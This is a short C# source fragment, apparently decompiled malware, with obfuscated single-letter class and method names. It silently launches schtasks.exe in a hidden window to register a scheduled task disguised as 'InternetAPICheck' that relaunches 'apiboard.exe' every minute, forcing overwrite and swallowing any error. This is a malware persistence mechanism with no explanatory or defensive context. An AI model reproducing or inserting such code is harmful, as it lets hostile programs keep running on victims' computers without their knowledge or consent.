using System.Diagnostics;

internal class n
{
	public static void a()
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "schtasks.exe",
				CreateNoWindow = false,
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/create /sc MINUTE /mo 1 /tn \"InternetAPICheck\" /tr \"" + g.b + "\\apiboard.exe\" /f"
			});
		}
		catch
		{
		}
	}
}
